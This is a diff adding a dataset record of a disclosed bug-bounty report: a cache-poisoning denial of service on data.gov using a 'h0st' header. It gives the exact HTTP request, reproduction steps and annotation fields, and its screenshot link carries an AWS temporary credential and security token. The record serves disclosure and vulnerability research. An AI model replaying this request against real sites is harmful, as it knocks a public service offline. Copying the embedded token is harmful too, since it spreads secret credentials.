@@ -1,0 +1,48 @@
+{
+    "reported_to": "GSA Bounty",
+    "reported_by": "kq8dq ",
+    "title": "Denial of service via cache poisoning on https://www.data.gov/",
+    "content": "\nAn attacker can persistently block access to any on https://www.data.gov/ by using cache poisoning with the h0st headers to cause\n502 response code\u3002\nTo replicate:\nload https://www.data.gov/ in your browser.\nlook the burp , add ?xyzxyz=1 as cache buster , and add h0st headers h0st: wrtqvavjigwdvoqk in your burp.\nload https://www.data.gov/?xyzxyz=1 in your browser. again.\nand you win see 502 ERROR\n<image_0>\nmy http request\uff1a\nCode 551 Bytes\n1GET /?xyzxyz=1 HTTP/1.1\n2Host: www.data.gov\n3Connection: close\n4Cache-Control: max-age=0\n5Upgrade-Insecure-Requests: 1\n6User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36\n7Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n8Sec-Fetch-Site: none\n9Sec-Fetch-Mode: navigate\n10Sec-Fetch-User: ?1\n11h0st: wrtqvavjigwdvoqk\n12Sec-Fetch-Dest: document\n13Accept-Encoding: gzip, deflate\n14Accept-Language: zh-CN,zh;q=0.9\n15\nFor more information on the theory behind this attack, check out https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning\nSimilar report\uff1a\nhttps://hackerone.com/reports/622122\nhttps://hackerone.com/reports/409370\nImpact\nAn attacker can persistently block access to any on https://www.data.gov/\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "None"
+    ],
+    "screenshots": {
+        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/KwxKSBjmGLemgiHxG8y4DSk8?response-content-disposition=attachment%3B%20filename%3D%2220200726025249.png%22%3B%20filename%2A%3DUTF-8%27%2720200726025249.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQS32RNFLZ%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T193728Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFzWqD%2Fvpk1K7ZuKaeAN%2FxfPAK85ldKCK6WuSTzdv1l%2BAiEA8NfsMUByD90pv7SCsTlM%2BT97G5F10b5vL1rGWjNVEfoqsgUIHBADGgwwMTM2MTkyNzQ4NDkiDG23U4OhU%2FykC6oXzSqPBX8skq00p%2BKRI3wihNVwEZ25x95HEiiSY1iVBQQFZ%2BMIML5IuB6HLIcTmUlJcmWWAYnbUXZAFKTPjZt%2BhY14r114UANXCCii6WUezVnKV1GSV4uoOR0SQYzv9RUHzRxVp2hSbyx3eW31GzOWiTD7rSryIOIc1Yo8zkpj2%2BN5kLhMYUlWvF6uuXbMFpN7lcsViiwVSqcWLF0WMyOu30kBDI0WS6k60yQqRMpoDhzO0rUNxCvOvRQ1WIVuCbix4xYAwJNlMLO5hE82WNEhooHzVNqoLhqSZcQndGUxpwxv4liR2fLg%2B2KSzah7cl19wD6x%2FTTDDL2g%2F9yoTudFB53KBWxwCyubmWipCeN6hKtJtktZ%2BhRormR9BX0D5rL4DG3iUqBJWVXCXuCyFg88dK05XYkC6CUae3CQRPL2XSVuCr2TpHn3ufcP8lu7uu3tGFSU5bNi%2FxLitvGEAmgPzYgR1a5ZtRC%2BzEcJrQ3gFCcQ5scHyJMrBEWHPa5NR%2BWpZtlakslMwzwAFTTibVhBjfrB6qAtuWvA51ElEY6Ib7vQ3YINzyA0sxwLKo3zj%2Bn5z4myeX2nIy7lVfljlX1tRsyyXoppygetDu%2F%2BeByWdZhr2guwmjj7j61rXh%2BdzI7XPxqMr%2BYjPOXfnQuE8uk%2FaEjVfrQg%2BxhAUvVZAHuf74V0TnTfC1dYozt8rSqqb93D2OiBMDzCcODgvvoDM2jMaoLKo7fNiuZzuBbOCO5zg6aif8aKmph82jYummXVB%2FiW7IBwnSEdIEBuh6JmbzqYNLAd7OI8qWap6eY75QG2Oo38sQvYOKYs1tNF8s37xUyjqFTkmQwzy77LcZ08lMl6KVQcvmRUY4aTQ8EBO%2BbjPUvDBJEwgPmLvwY6sQFVnHOrsExwv8pBwXp%2BmKxzRYIMiFRwVB8L6sTxAmpwhvJLpV6OGBPya1vp13gZsSv%2BLdDCRqVLrMqYGsnWkyunxwjU0HBwSXuIWS9qlXFL0PoSMfoANfS7LRot3%2FBUGXJpkn6Gx5WRfDsamCptLatQ6yxWoO%2FOsa0mvz9bpP1ka7o%2Brm55IDaUgqP%2FEa0yEnubWmEraKkmWNPl%2BV4IDRBDVfq5uMZSv%2BIXkeYVvmDGpyM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c17e4a7f869b6f50a26c775de5ead45839f1168fed70a3d02bc32b1cc67adffe"
+    },
+    "disclosed_date": 1623800520,
+    "report_url": "https://hackerone.com/reports/942629",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Load https://www.data.gov/ in your browser."
+        ],
+        [
+            2,
+            "Add ?xyzxyz=1 as a cache buster and include the h0st header with a random value (e.g., h0st: wrtqvavjigwdvoqk) in your request."
+        ],
+        [
+            3,
+            "Reload the modified URL (https://www.data.gov/?xyzxyz=1) in your browser."
+        ],
+        [
+            4,
+            "Observe the 502 ERROR response, indicating successful cache poisoning."
+        ]
+    ],
+    "vuln_description": "An attacker can persistently block access to any page on https://www.data.gov/ by poisoning the cache with a malicious h0st header, causing the server to return a 502 response. This denial-of-service attack exploits improper cache handling of the h0st header.",
+    "reason": "The attack involves a straightforward manipulation of HTTP headers (h0st) and a cache buster parameter. While it requires knowledge of cache poisoning techniques, the steps are simple and do not involve complex interactions or novel logic.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": "622122"
+}
